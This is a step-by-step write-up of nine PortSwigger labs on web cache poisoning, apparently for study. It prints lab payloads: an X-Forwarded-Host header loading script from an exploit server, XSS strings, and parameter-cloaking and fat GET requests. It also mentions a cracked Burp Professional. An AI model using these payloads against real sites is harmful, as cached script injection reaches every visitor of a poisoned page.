## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **Web Cache Poisoning**:

**Web cache poisoning with an unkeyed header**  
This lab demonstrates how attackers can poison cache responses by exploiting headers that are not included in the cache key.

**Web cache poisoning with an unkeyed cookie**  
This lab shows how cookies not included in cache keys can be abused for cache poisoning attacks.

**Web cache poisoning with multiple headers**  
This lab explores exploiting combinations of headers that are not properly keyed in the cache system.

**Targeted web cache poisoning using an unknown header**  
This lab demonstrates using non-standard or undocumented headers to poison cached responses.

**Web cache poisoning via an unkeyed query string**  
This lab shows how query strings that are not part of the cache key can be exploited for poisoning.

**Web cache poisoning via an unkeyed query parameter**  
This lab demonstrates poisoning attacks targeting individual query parameters that are ignored by the caching layer.

**Parameter cloaking**  
This lab shows how attackers can obfuscate parameters to achieve cache poisoning while evading detection.

**Web cache poisoning via a fat GET request**  
This lab explores using oversized GET requests to trigger cache poisoning behaviors.

**URL normalization**  
This lab demonstrates how URL normalization inconsistencies between cache layers and application servers can lead to successful poisoning attacks.

---



### LAB 1 - Web cache poisoning with an unkeyed header

### Lab Description

<img width="858" height="409" alt="image" src="https://github.com/user-attachments/assets/fc596cef-d2c1-4369-bfba-cfcd18602ea2" />

### Solution

When we launch the lab, the following page appears:

<img width="1884" height="599" alt="image" src="https://github.com/user-attachments/assets/5d0662e9-5aba-481c-ade3-edbdba58dae2" />

Changing the URL of the `Host` header results in an error:

<img width="1874" height="566" alt="image" src="https://github.com/user-attachments/assets/1ca532c7-b957-49c6-8e7b-ac24eb067aae" />

You could optionally change the port (e.g., to `90`) to attempt to load a script. I didn’t explore that path, but feel free to test it:

<img width="1905" height="590" alt="image" src="https://github.com/user-attachments/assets/ac932cd4-6c30-4169-89c3-8ce0be92eda0" />

Now, we observe that using the `X-Forwarded-Host` header lets us change the script source to `apples.com`, as shown by the highlighted URL:

> `apples.com/resources/js/tracking.js`

<img width="1920" height="740" alt="image" src="https://github.com/user-attachments/assets/fdcca60d-f71b-4527-bb04-6ef639fb459c" />

In the first request, we get a **cache miss**.

Then on sending the same request again, we get a **cache hit**, confirming the response has been cached:

<img width="1913" height="639" alt="image" src="https://github.com/user-attachments/assets/c3445e40-8fae-4dbd-b2a7-bf7c51f802bc" />

---

### Cache Buster

Before modifying the request, it's important to use a **cache buster**. This helps avoid accidentally poisoning the cache for other users during testing.

Add a cache-busting parameter to the URL, like so:

```http
http://example.com/page.html?cache=123456
```

Here, `cache=123456` ensures the response is unique to your request.

<img width="1527" height="882" alt="image" src="https://github.com/user-attachments/assets/ee25dbae-3a0e-45b9-a11f-bc3d0faf6937" />

In this case, we use `/?cb=1234` as our cache buster:

<img width="1912" height="577" alt="image" src="https://github.com/user-attachments/assets/6ff6b943-5a8b-4987-97ad-db42932feb7e" />

---

PortSwigger provides a mock **Exploit Server** to simulate a malicious response.

We configure the server to serve the following file:

```
/resources/js/tracking.js
```

And in that file, insert the payload:

```javascript
alert(document.cookie);
```

<img width="1576" height="855" alt="image" src="https://github.com/user-attachments/assets/6010c91c-79a1-4655-8c8a-a653ce18ed74" />

Then update your request to use:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

> Replace `YOUR-EXPLOIT-SERVER-ID` with the domain assigned to you by PortSwigger.

The first request gives a **cache miss**:

<img width="1661" height="507" alt="image" src="https://github.com/user-attachments/assets/75ee8edc-2d03-44ae-a7f1-39c7e40288ac" />

Sending the same request again results in a **cache hit**, confirming the cache was poisoned:

<img width="1910" height="445" alt="image" src="https://github.com/user-attachments/assets/3184e6bf-03e0-4f68-b520-7f8cd895b925" />

Now we remove the cache buster and repeat the same request to test if poisoning works across the normal route.

---

### Note:

To simulate a victim, open the poisoned URL in a browser. You should see the `alert()` triggered.
⚠️ Keep in mind: The cache in this lab expires every **30 seconds**, so act quickly.

#### `cache: miss`

<img width="1732" height="651" alt="image" src="https://github.com/user-attachments/assets/688ef9dc-28ba-4658-933e-9f594b4b8a9b" />

#### `cache: hit`

<img width="1658" height="562" alt="image" src="https://github.com/user-attachments/assets/499eebd0-4e3f-4b72-8ea7-912a62f80a82" />

###  Alert triggered and lab is solved:

<img width="1804" height="309" alt="image" src="https://github.com/user-attachments/assets/200e4073-4a34-43d1-8c13-2084407f1797" />



---

### LAB 2 - Web cache poisoning with an unkeyed cookie.

### Lab Description

<img width="839" height="270" alt="image" src="https://github.com/user-attachments/assets/9d93d67b-e8dc-4754-9026-9111534fc110" />

### Solution

 When we look at normal request we can see that url and cookie late part are reflected in the  response

<img width="1890" height="722" alt="image" src="https://github.com/user-attachments/assets/fdbacee0-5229-4ffb-bf1f-afd7ed3d5d6d" />

Changing the url give us error

<img width="1885" height="524" alt="image" src="https://github.com/user-attachments/assets/3f4a54c1-b033-41b3-b463-00009b7dd719" />

Now we change cookie **fehost with king** and we can see in reponse its been reflected
First time we send it gives us **miss** second time we send gives us **hit**

<img width="1871" height="637" alt="image" src="https://github.com/user-attachments/assets/7e2716ad-a5a9-4b83-ba84-6cc0d55f9d54" />

Now we have to alert on screen to solve the lab we used below script we can also used any other which work for example:`fehost=someString"-alert(1)-"someString`
	
	
First time we send request it gives us `cache:miss`

  <img width="1913" height="670" alt="image" src="https://github.com/user-attachments/assets/60b616d0-5af9-4e05-bcb4-b3b290903627" />

  Second time we send request it gives us `cache:hit`


<img width="1919" height="710" alt="image" src="https://github.com/user-attachments/assets/b6ca6b42-50b8-41a8-8664-96fdc80dd41a" />

  And we can see below lab is solved

<img width="1263" height="766" alt="image" src="https://github.com/user-attachments/assets/07ad65f6-a151-455d-94c3-e35cf807e8b7" />



---

### LAB 3 - Web cache poisoning with multiple headers

### Lab Description

<img width="853" height="407" alt="image" src="https://github.com/user-attachments/assets/5b2b5a10-dd74-44ba-8834-cb032e63a59d" />

### Solution

Send normal request and see host is reflected in reponse no it not as we can see below image.


<img width="1884" height="816" alt="image" src="https://github.com/user-attachments/assets/ef20c6c5-1145-4757-b893-2f91dc61c1e9" />

We can see tha script which is loading from host is `/resource/js/tracking.js`


<img width="1641" height="593" alt="image" src="https://github.com/user-attachments/assets/53f6e74e-3064-45d8-aadc-a8a10ecd17c2" />

Changing host header gives us `403` response

<img width="1875" height="503" alt="image" src="https://github.com/user-attachments/assets/e4fe4b37-2aa7-4691-8755-f329e01c18c0" />

The **X-Forwarded-Proto (XFP)** header is a de-facto standard header for identifying the protocol (HTTP or HTTPS) that a client used to connect to your proxy or load balancer. Your server access logs contain the protocol used between the server and the load balancer, but not the protocol used between the client and the load balancer. To determine the protocol used between the client and the load balancer, the X-Forwarded-Proto request header can be used.
		
		
Using **x-forwaded-proto** http redirect us to which prersent in **host header**


<img width="1116" height="412" alt="image" src="https://github.com/user-attachments/assets/acd98928-7549-4cf1-b7bc-6d9be1401e2d" />


And also we use `x-forwarded-host` and we  can see in below image it is now redirecting to https and thw domain which we give in `x-forwarded host exmple.com`


<img width="1444" height="697" alt="image" src="https://github.com/user-attachments/assets/3e769794-7045-4da9-be24-0f43d3e04c91" />
		
  Configuring our server to serve `/resource/js/tracking.js` and genrate alert cookie in js and then store exploit


<img width="1358" height="821" alt="image" src="https://github.com/user-attachments/assets/ffe18a49-de14-46f9-be3e-639089262686" />

cllick on view exploit

<img width="999" height="294" alt="image" src="https://github.com/user-attachments/assets/d1c1d4f4-af42-46dc-b500-7ab9816117fe" />


Changing `x-forwaded-host` to our exploit server domain and it will now load our server file and generate alert

  <img width="1323" height="625" alt="image" src="https://github.com/user-attachments/assets/380341f4-e94e-4e16-bffc-1940aeb3fc10" />

Generater alet and lab is solved


<img width="1766" height="431" alt="image" src="https://github.com/user-attachments/assets/208fbc47-fb8a-459a-aa9f-9c7ee5df503e" />

Solved


<img width="1742" height="286" alt="image" src="https://github.com/user-attachments/assets/60408a87-1a72-481d-aeb4-e08fb8ee047d" />

---

### LAB 4 - Targeted web cache poisoning using an unknown header

### Lab Description

<img width="861" height="361" alt="image" src="https://github.com/user-attachments/assets/89e5d08a-7de8-45fe-9912-b5afd9214a0a" />

### Solution

First we will check what is reflected and what is Cache and what is reflected in response we will see below these things
**Host:oa.….… ** reflected in response and using **/resources/css/js/tracking.js** file to load js file
Vary:useragnet(mean user agent is included in `cache` and hit or miss cache

<img width="1398" height="472" alt="image" src="https://github.com/user-attachments/assets/a5b11c18-fd5f-41c9-9b53-6ab80c37255e" />

We used **X-forwarded-HOST** but did not change our host url as we can see below.


<img width="1896" height="719" alt="image" src="https://github.com/user-attachments/assets/da1d2107-35de-450a-9566-7041543c2001" />

Now used param miner to identify header not working in `burp proessinal` crack but work on `burp community linux`

<img width="1414" height="679" alt="image" src="https://github.com/user-attachments/assets/d50fc8e8-71d2-4163-a0a2-9c07227ef69d" />
	 
  Configuration of param which is default in our case


<img width="1519" height="682" alt="image" src="https://github.com/user-attachments/assets/1e3b960b-a367-40e0-927e-d7b28892f3af" />

As we can look at **x-host header** is identified


<img width="1110" height="604" alt="image" src="https://github.com/user-attachments/assets/8bda8414-2ee7-402f-8207-11997e3af16a" />

	
Now using `x-host` to change url which is reflected in response


<img width="1814" height="687" alt="image" src="https://github.com/user-attachments/assets/e03ad2f5-af20-4249-a01b-5d11957f600f" />

Configurating our exploit server to alert when we change it to **x-host** and and the file the above url is taking so it will request **/resources/….** From a

  The exploit server

<img width="902" height="816" alt="image" src="https://github.com/user-attachments/assets/72b481b0-ba17-4df0-84bb-1f846a0ac149" />

And we can see alert belo image from abve request but in this lab we have to target specific user-agent  victum to solved the lab ,So which user have that user-agent alert will be generated to them in cache.


<img width="1568" height="772" alt="image" src="https://github.com/user-attachments/assets/f77e7d95-8002-4ab6-8e22-e7d6ecd30922" />
Commenting we can also used tresources/js/tracking.js file of exploit server 
 We Will give `404` response and we will get agent which we have to target

<img width="1201" height="781" alt="image" src="https://github.com/user-attachments/assets/d433d641-9249-46b9-bad8-765d628856f6" />

As we can see we  get 404 reponse in access log of server.


<img width="1714" height="136" alt="image" src="https://github.com/user-attachments/assets/3123d567-aa9c-4f27-aa1c-bfc37944de69" />

`X-host` has our exploit server url and `user-agent` have above agent Of our url 


<img width="1679" height="597" alt="image" src="https://github.com/user-attachments/assets/be84044d-2903-4270-bca3-fa5d2dc9652c" />

Sending above request will solved lab


<img width="1897" height="419" alt="image" src="https://github.com/user-attachments/assets/630e2812-3fba-43f8-8f3b-7a74fed266bf" />


---

### LAB 5 - Web cache poisoning via an unkeyed query string

### Lab Description

<img width="880" height="535" alt="image" src="https://github.com/user-attachments/assets/72eb8bb8-bed7-4c13-a951-b245496f09f9" />

### Solution

### Overview: Exploiting Cache Implementation Flaws 

While traditional web cache poisoning focuses on manipulating unkeyed headers or cookies, **exploiting cache implementation flaws** involves abusing how caching systems generate and handle **cache keys**. These flaws arise from misconfigurations or inconsistencies in how specific caches normalize, transform, or ignore parts of HTTP requests.

Instead of relying on classic attack vectors, this advanced methodology requires a **deeper understanding of cache behavior**, probing how the cache responds to subtle changes in requests, and chaining these quirks with other client-side vulnerabilities (like **reflected XSS**, **open redirects**, or **resource imports**) to escalate the impact.

This approach significantly expands the attack surface, allowing attackers to:

* Poison caches via unkeyed or misprocessed request components.
* Turn benign-looking pages into delivery mechanisms for malicious payloads.
* Exploit vulnerabilities previously considered unexploitable by chaining them with cache key flaws.

The process generally involves:

1. **Identifying a cache oracle** to observe cache behavior.
2. **Probing key handling** to spot anomalies or exclusions.
3. **Finding an exploitable gadget** to deliver a high-impact attack.

Common flaws include:

* Unkeyed **port numbers**, **query strings**, or **individual parameters**
* Inconsistent **path normalization**
* **Cache parameter cloaking**
* **Cache key injection**
* Poisoning of **internal (application-level) caches**

These techniques—when combined with tools like **Burp Suite** and **Param Miner**—enable attackers to bypass normal caching logic, create persistent exploits, and even poison high-traffic pages, potentially impacting thousands of users.

---


<img width="1732" height="347" alt="image" src="https://github.com/user-attachments/assets/ef8572f0-d3d8-4694-9e17-ee88a5ef17b4" />

	Using below 4  cache bluster orgin stand out to be work

```
	Accept-Encoding: gzip, deflate, cachebuster
           Accept: */*, text/cachebuster
           Cookie: cachebuster=1 
	Origin: https://cachebuster.vulnerable-website.com
 ```


<img width="1900" height="580" alt="image" src="https://github.com/user-attachments/assets/621bd4b8-13e9-4c73-8046-12011bf41a5f" />

In red arrow we can see that how do apply differnet cache bluster technique


<img width="1857" height="754" alt="image" src="https://github.com/user-attachments/assets/89fde95e-2572-44b9-a9b7-97440883763f" />

Remove the cache-buster Origin header.In other word elict harmful reponse without cache bluster sending request 15 to 20 times solved the lab


<img width="1843" height="592" alt="image" src="https://github.com/user-attachments/assets/b57ba071-2685-4d28-84c8-d844d66747e4" />


<img width="1641" height="302" alt="image" src="https://github.com/user-attachments/assets/a8b8f8a8-243d-4c15-a624-d6ce6efb4053" />

---


### LAB 6 - Web cache poisoning via an unkeyed query parameter

### Lab Description

<img width="861" height="436" alt="image" src="https://github.com/user-attachments/assets/e412681b-f70b-4951-82a0-e6c3aca36f2b" />


###  Overview: Unkeyed Query Parameters in Cache Poisoning 

Some web applications selectively **exclude specific query parameters** from the cache key—typically ones used for **analytics** or **advertising**, such as `utm_content`. These parameters are considered irrelevant by the backend and thus ignored when generating the cache key.

While these **excluded parameters** generally don’t affect the response significantly, they can still pose a threat in certain situations:

* If the **entire URL** is reflected or processed insecurely (e.g. in Open Graph tags or client-side scripts), even **arbitrary unkeyed parameters** can become dangerous.
* When combined with **gadgets** like reflected XSS, unkeyed parameters could be used to poison cache entries and serve malicious content to all users accessing the same base URL.

In short, although unkeyed parameters may seem harmless, they **can be exploited on pages that mishandle the full URL or fail to sanitize input**, making them a valid vector for advanced web cache poisoning attacks.


### Solution

  First we can see that how website look like in below image
 
 <img width="1560" height="545" alt="image" src="https://github.com/user-attachments/assets/de3c2583-ea6c-4a82-b756-8b61cf2e9e80" />
 
Sending the  above request to rpeater we can see that cache hit  or mis and age cache control which tell us that it application is using cacahe of server to get website

 <img width="1756" height="599" alt="image" src="https://github.com/user-attachments/assets/ff6f1142-baaa-41cf-aeef-0ceac499271e" />

Now adding cache buster we can see that it is relected in reponse we can try to break and get xss ,In our case we used `utm_parameter` whioch gives higher chance xss then our norrmla parameter equest

<img width="1735" height="549" alt="image" src="https://github.com/user-attachments/assets/2ac82714-ac7c-4b45-9532-ba8fba3d00cb" />

 We can see that utm parameter below

 <img width="1661" height="499" alt="image" src="https://github.com/user-attachments/assets/dc8f2d4b-c262-4f70-8e28-503d0e367434" />


Identifying parameter
	
<img width="1661" height="499" alt="image" src="https://github.com/user-attachments/assets/a049bd34-31d1-4f9e-8f67-cf3a8741d64c" />

	
Uisng a parm miner we have idenfified utm pa=armeter
	
<img width="1359" height="679" alt="image" src="https://github.com/user-attachments/assets/9d27e896-be39-406b-987e-c07a63207673" />


	
End a request with a utm_content parameter that breaks out of the reflected string and injects an XSS payload:
	
 `GET /?utm_content=random'/><script>alert(1)</script>`
	
<img width="1906" height="657" alt="image" src="https://github.com/user-attachments/assets/fc8cf240-961a-4297-93a0-8dff91191231" />

	
	
And sendng multiple time above request generate alert and lab is solved

<img width="1464" height="371" alt="image" src="https://github.com/user-attachments/assets/28c739b2-5c20-4d7c-9d59-419ac8b5eb6e" />

---

### LAB 7 - Parameter cloaking

### Lab Description

<img width="850" height="469" alt="image" src="https://github.com/user-attachments/assets/6cb07fe7-dd6f-4713-8ec4-32e362ab2f9b" />




## Overview: Cache Parameter Cloaking

**Cache Parameter Cloaking** is a powerful web cache poisoning technique that takes advantage of inconsistencies between how **caching systems** and **backend applications** parse query parameters.

In many real-world applications, certain query parameters—typically used for analytics or tracking—are **excluded from the cache key**. While these excluded parameters are not considered by the caching layer, they **are still processed by the backend**. This opens up a unique opportunity for attackers to **inject malicious input** that gets processed by the server but doesn't affect the cache key.

---

### How It Works

The technique relies on **parameter parsing quirks**—especially when the cache and the backend parse requests differently. For example:

```http
GET /?example=123?excluded_param=bad-stuff
```

* The **cache** might interpret this as two parameters:

  * `example = 123`
  * `excluded_param = bad-stuff`
* The **backend** might interpret it as one parameter:

  * `example = 123?excluded_param=bad-stuff`

If `example` is used in a context like a reflected script or file path, the injected data (`bad-stuff`) becomes part of the response, allowing for **persistent XSS or script injection** without altering the cache behavior.

---

###  Realistic Exploitation Scenario

Say the server is using **JSONP** and reflects a `callback` parameter like:

```http
GET /jsonp?callback=innocent
```

You might poison the cache using:

```http
GET /jsonp?callback=innocent?callback=alert(1)
```

* The **cache** only keys on the first `callback=innocent`
* The **backend** may process `callback=alert(1)` instead
* Anyone accessing the cached version triggers your injected JavaScript

---

### Other Cloaking Tricks

You can also exploit parsing quirks using:

* Multiple delimiters (`?`, `&`, `;`)
* Repeating parameter names
* Encoding tricks (`%3F`, `%26`)

For example:

```http
GET /?keyed=abc&excluded=123;keyed=poison
```

* The **cache** sees `keyed=abc` only
* The **server** may parse `keyed=poison` as the final value

This mismatch can allow you to inject **unexpected behavior** without interfering with the cache key.

---

### Solution

 First intercept the requets and we see that it using cache and we can also
  See that cookie is seeing
  
  <img width="1843" height="630" alt="image" src="https://github.com/user-attachments/assets/0fdcb6d4-b13f-4890-aa8e-5643ddc528a6" />

 Using cacke bluster we can see that it is cache and refletced in reponse we can also see **callback function in red rectangle**

<img width="408" height="81" alt="image" src="https://github.com/user-attachments/assets/61b0d234-9790-4f4b-ae1f-bfc3a450c892" />

  Try xss but characters are blocks

<img width="1918" height="566" alt="image" src="https://github.com/user-attachments/assets/b6c94b12-a1e2-4c5e-b0c0-1ba4981f694a" />

   Observe that every page imports the script /js/geolocate.js, executing the callback function `setCountryCookie()`. Send the request `GET /js/geolocate.js?callback=setCountryCookie` to Burp Repeater.
   Notice that if you use a `semicolon (;)` to append another parameter to utm_content, the cache  treats this as a single parameter. This means that the extra parameter is also excluded from the cache key. Alternatively, with Param Miner loaded, right-click on the  
   request and select "Bulk scan" > "Rails parameter cloaking scan" to identify the vulnerability automatically.
   
   We can see the code of callback functionwhich we have idenfied.

<img width="1742" height="444" alt="image" src="https://github.com/user-attachments/assets/9da252d0-d4bb-43c3-942c-33273b81e27c" />

Notice that you can control the name of the function that is called on the returned data by editing the callback parameter. **However, you can't poison the cache for other users in this way because the parameter is keyed**
Study the cache behavior. Observe that if you add duplicate callback parameters, only the final one is reflected in the response, but both are still keyed. However, if you append the second callback parameter to the utm_content parameter using a semicolon, it is          excluded from the cache key and still overwrites the callback function in the response:
	Send the request again, but this time pass in alert(1) as the callback function:

        ```
         GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1)
        ```
	
<img width="1590" height="562" alt="image" src="https://github.com/user-attachments/assets/29df1f38-8a27-4f1e-8d7d-d015014673c8" />

Get the response cached, then load the home page in the browser. Check that the `alert()` is triggered and lab is solved.

      
 <img width="1542" height="330" alt="image" src="https://github.com/user-attachments/assets/95aa5e1c-4b00-417d-84e3-599a02c8f952" />

  ---

### LAB 8 - Web cache poisoning via a fat GET request

### Lab Description

<img width="858" height="292" alt="image" src="https://github.com/user-attachments/assets/37fa5201-8e58-4535-8cdc-cbc07b941a52" />


## Overview: Exploiting Fat GET Support 

In some rare but critical scenarios, a web server or application may improperly handle **HTTP request bodies on GET requests**, leading to what's known as a **fat GET request**. This opens the door for advanced cache poisoning attacks, even when classic vectors fail.

---

###  What is a Fat GET Request? 

A **fat GET** is a GET request that includes a **message body**—a behavior that technically violates the HTTP standard but is still processed by some misconfigured applications.

#### Example:

```http
GET /?param=innocent HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

param=bad-stuff-here
```

* The **cache** uses only the request line (`/param=innocent`) to generate the cache key.
* The **backend** may prioritize the **body value** (`param=bad-stuff-here`) and use it in the response.

This **discrepancy** between what the cache sees and what the server processes creates an opportunity to inject malicious input that is **cached and later served to others.**

---

### Solution



When we open proxy and look at target we can see that cachable https response.

<img width="674" height="573" alt="image" src="https://github.com/user-attachments/assets/2b0cfccd-ffef-493b-8db1-13c7d514c52c" />

Observe that every page imports the script `/js/geolocate.js`

<img width="1738" height="620" alt="image" src="https://github.com/user-attachments/assets/56d996e6-2845-4e44-b9e8-3d208cb727cb" />

Executing the callback function we can see in response **setCountryCookie()**

<img width="1631" height="513" alt="image" src="https://github.com/user-attachments/assets/fca76516-74b8-46b3-8754-e859244c52e1" />

We can change the  callback  function  parameter  value and response  is reflected  which is **kinge**

<img width="1545" height="501" alt="image" src="https://github.com/user-attachments/assets/9e917b6f-325f-4e51-9721-796bd823f658" />

	
Now change callback  function  to `alert(1)` but I doesnot generate  alert  which means some validation  is applied
In header we have cache  bluster in origins


<img width="1669" height="493" alt="image" src="https://github.com/user-attachments/assets/680e1b32-96d8-4fb6-abee-b224958fbbea" />


Now we have same callback  function  in header  but  alert callback 
In body Send the request again, but this time pass in alert(1) as the callback function. Check that you can successfully poison the cache.

<img width="1407" height="584" alt="image" src="https://github.com/user-attachments/assets/fa88e5fd-345e-4ad5-a2ab-cd544d82d078" />
	
Remove any cache busters and re-poison the cache. The lab will solve when the victim user visits any page containing this resource import URL.
	
<img width="1419" height="335" alt="image" src="https://github.com/user-attachments/assets/72dab820-082a-4d15-a67c-2d70f15c7532" />

---

### LAB 9 - URL normalization

### Lab Description

<img width="873" height="323" alt="image" src="https://github.com/user-attachments/assets/6a73f1a2-74de-4df0-ad20-70ba3c30e379" />

### Solution

First we intercept the request and we can see that it is performing cache in the server.

<img width="1914" height="810" alt="image" src="https://github.com/user-attachments/assets/40c195f3-d6b5-4876-a08b-faf82412f80a" />

Adding random in header or any other path is giving us error Not Found `/Random`,so to solve the lab we have deliver url to vixtum which will do xss,So we will try to brae the paragraph tag and add script tag for xss.

<img width="1341" height="577" alt="image" src="https://github.com/user-attachments/assets/5302dde7-42cb-4015-b9d5-2087786d861f" />


Now adding  `/random</p><script>alert(1)</script><p>` foo wiil break url and add script tag.

<img width="1603" height="557" alt="image" src="https://github.com/user-attachments/assets/f5b991d9-a7bf-48a2-825d-5c65d9835f0b" />

Copying the response of url.

<img width="1609" height="566" alt="image" src="https://github.com/user-attachments/assets/eaf4f205-0de5-4185-99b5-61abf9820e55" />

 So copy url and deliver to victum 
 Notice that if you request this URL in the browser, the payload doesn't execute because it is URL-encoded So you have to hit cache and the immediately **DELIVER PAYLOAD TO VICTUM**.

  This time, the **alert()** is executed because the browser's encoded payload was URL-decoded by the cache, causing a cache hit


<img width="1582" height="445" alt="image" src="https://github.com/user-attachments/assets/8b883934-aa1c-436a-92db-2858786bde8b" />

Lab is solved

<img width="1585" height="334" alt="image" src="https://github.com/user-attachments/assets/10598887-5e12-48cf-b05c-b913ece3f401" />


---
